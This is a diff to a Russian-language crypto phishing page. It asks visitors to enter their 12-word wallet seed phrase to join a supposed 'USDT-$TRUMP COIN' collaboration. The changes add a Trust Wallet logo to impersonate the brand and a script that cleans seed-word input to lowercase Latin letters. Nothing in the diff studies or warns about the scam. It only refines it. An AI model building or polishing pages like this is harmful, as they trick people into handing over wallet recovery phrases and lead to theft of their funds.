@@ -25,6 +25,13 @@
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             text-align: center;
         }
+        .logo {
+            margin-bottom: 16px;
+        }
+        .logo img {
+            width: 80px;
+            height: auto;
+        }
         h1 {
             font-size: 20px;
             margin-bottom: 16px;
@@ -93,6 +100,9 @@
 </head>
 <body>
     <div class="container">
+        <div class="logo">
+            <img src="https://trustwallet.com/assets/images/media/assets/tw-logo.svg" alt="Trust Wallet Logo">
+        </div>
         <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
         <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
@@ -150,5 +160,16 @@
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
+
+    <script>
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', function () {
+                this.value = this.value.replace(/[^a-z]/g, '').toLowerCase(); // Только латинские буквы
+            });
+            input.addEventListener('focus', function () {
+                this.setAttribute('inputmode', 'latin'); // Активирует английскую клавиатуру
+            });
+        });
+    </script>
 </body>
 </html>
